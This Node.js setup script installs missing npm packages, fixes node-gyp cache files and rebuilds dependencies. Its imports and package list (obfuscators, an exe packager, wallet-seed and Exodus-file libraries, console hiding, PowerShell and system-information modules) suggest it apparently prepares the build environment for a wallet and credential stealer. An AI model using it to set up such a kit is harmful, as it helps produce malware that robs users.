const jsconfuser = require('js-confuser');
const jsobf = require("javascript-obfuscator");
const fs = require("fs");
const child_process = require("child_process");
const os = require("os");
const https = require('https');
const exe = require('@angablue/exe');
const config = require("./config.js")()


async function install_node_gyp() {
    return new Promise(res => {
        res(child_process.execSync("npm install -g node-gyp"))
    })
}

var isModuleAvailableSync = function (moduleName) {
    var ret = false; // return value, boolean
    var dirSeparator = require("path").sep

    // scan each module.paths. If there exists
    // node_modules/moduleName then
    // return true. Otherwise return false.
    module.paths.forEach(function (nodeModulesPath) {
        if (fs.existsSync(nodeModulesPath + dirSeparator + moduleName) === true) {
            ret = true;
            return false; // break forEach
        }
    });

    return ret;
}

async function install_module(module_name) {
    return new Promise(res => {
        res(child_process.execSync(`npm install ${module_name}`))
    })
}

async function check_all_modules_installed() {
    return new Promise(async (res) => {
        [
            "@angablue/exe",
            "@peculiar/webcrypto",
            "axios",
            "bitcoin-seed",
            "dapifix",
            "buffer-replace",
            "form-data",
            "javascript-obfuscator",
            "js-confuser",
            "node-forge",
            "node-gyp",
            "node-hide-console-window",
            "node-powershell",
            "request",
            "seco-file",
            "sqlite3",
            "systeminformation",
            "zip-lib"
        ].forEach(async (moduleName) => {
            if (!isModuleAvailableSync(moduleName)) {
                console.log(`Installing "${moduleName}" as it is not installed`)
                await install_module(moduleName)
                console.log(`Installed "${moduleName}"`)
            }
        })

        res()
    })
}

async function fix_node_gyp(versions) {
    const appdata = process.env.LOCALAPPDATA;

    for (var version of versions) {
        for (var file of fs.readdirSync(`${appdata}\\node-gyp\\Cache\\${version}\\include\\node`)) {
            if (file.includes(".DELETE")) {
                console.log(`node-gyp-fix | Fixed ${file}`)
                fs.renameSync(`${appdata}\\node-gyp\\Cache\\${version}\\include\\node\\${file}`, `${appdata}\\node-gyp\\Cache\\${version}\\include\\node\\${file.split(".DELETE")[0]}`)
            }
        }
    }
}

async function rebuild() {
    return new Promise(res => {
        console.log("Rebuilding packages")
        res(child_process.execSync("npm rebuild"))
        console.log("Rebuilt packages")
    })
}

async function fix_dependencies() {

    return new Promise(async res => {
        const appdata = process.env.LOCALAPPDATA;

        if (!fs.readdirSync(appdata).includes("node-gyp")) {
            await install_node_gyp();
            await fix_dependencies();
        }

        const node_js_versions = fs.readdirSync(`${appdata}\\node-gyp\\Cache`);

        if (!node_js_versions.includes("18.15.0")) {
            console.log("Could not detect Node.js v18.15.0. Please install Node.js v18.15.0 or run the install file again.");
            while (true) {}
        }

        await fix_node_gyp(node_js_versions)
        res(await rebuild());
    })
}

(async () => {
    let start = Date.now();

    console.log("Checking if all modules are installed")
    await check_all_modules_installed();
    console.log("Checked if all modules are installed")

    console.log("Fixing dependencies")
    await fix_dependencies();
    console.log("Fixed dependencies")

    console.log(`Successfully finished fixing within ${(Date.now() - start) / 1000} secondss`)
    console.log(`You can now close this window.`)

    while (true) { }
})()